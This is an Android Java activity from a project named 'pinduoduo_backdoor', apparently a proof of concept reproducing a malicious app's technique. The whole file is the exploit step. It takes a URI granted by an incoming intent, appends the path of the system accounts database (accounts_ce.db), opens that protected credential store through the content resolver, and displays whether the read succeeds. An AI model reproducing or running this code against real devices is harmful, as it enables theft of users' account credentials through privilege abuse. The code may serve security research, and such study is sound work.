package com.tech.pinduoduo_backdoor.alive.impl.provider.component;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;

import com.tech.pinduoduo_backdoor.R;

import java.io.InputStream;

public class HFPActivity extends Activity {

    private final static String TAG = "HFPActivity";
    
    @SuppressLint("WrongConstant")
    @Override  // android.app.Activity
    protected void onCreate(Bundle arg8) {
        super.onCreate(arg8);

        setContentView(R.layout.acitivity_second);
        TextView textView = findViewById(R.id.show_info);
        try {
            Intent intent = this.getIntent();
            int flags = intent.getFlags() & 0xC3;
            Log.d(TAG, "HFPActivity onCreate intent:" + intent + ", flags: " + flags);
            //grantUriPermission(getPackageName(), intent.getData(), flags);
            ContentResolver contentResolver = getContentResolver();
            Uri uri = Uri.parse(intent.getData() + "/data/system_ce/0/accounts_ce.db");
            InputStream inputStream = contentResolver.openInputStream(uri);
            Log.d(TAG, "uri: " + uri + ", canRead: " + inputStream);
            inputStream.close();

            String stringBuilder = "intent: " +
                    intent +
                    "\n" +
                    "read: " +
                    uri +
                    "\n" +
                    "canRead: " +
                    inputStream;
            textView.setText(stringBuilder);
        } catch (Exception e) {
            Log.e(TAG, "onCreate: " + e.getMessage());
            textView.setText(e.getMessage());
        }

    }
}
